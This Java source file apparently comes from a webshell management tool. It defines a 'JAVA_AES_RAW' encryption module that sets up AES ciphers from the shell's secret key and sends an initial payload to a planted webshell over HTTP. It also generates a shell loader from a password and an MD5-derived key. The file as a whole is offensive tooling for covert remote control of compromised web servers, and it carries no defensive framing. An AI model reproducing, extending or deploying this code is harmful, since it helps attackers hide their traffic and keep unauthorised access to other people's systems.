package shells.cryptions.JavaAes;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(Name = "JAVA_AES_RAW", payloadName = "JavaDynamicPayload")
public class JavaAesRaw implements Cryption {
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private Http http;
    private String key;
    private byte[] payload;
    private ShellEntity shell;
    private boolean state;

    @Override 
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        try {
            this.encodeCipher = Cipher.getInstance("AES");
            this.decodeCipher = Cipher.getInstance("AES");
            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
            //获取初始化payload，发送进行初始化
            this.payload = this.shell.getPayloadModel().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
                return;
            }
            Log.error("payload Is Null");
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override 
    public byte[] encode(byte[] data) {
        try {
            return this.encodeCipher.doFinal(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override 
    public byte[] decode(byte[] data) {
        try {
            return this.decodeCipher.doFinal(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override 
    public boolean isSendRLData() {
        return false;
    }

    @Override 
    public boolean check() {
        return this.state;
    }

    @Override 
    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
    }
}
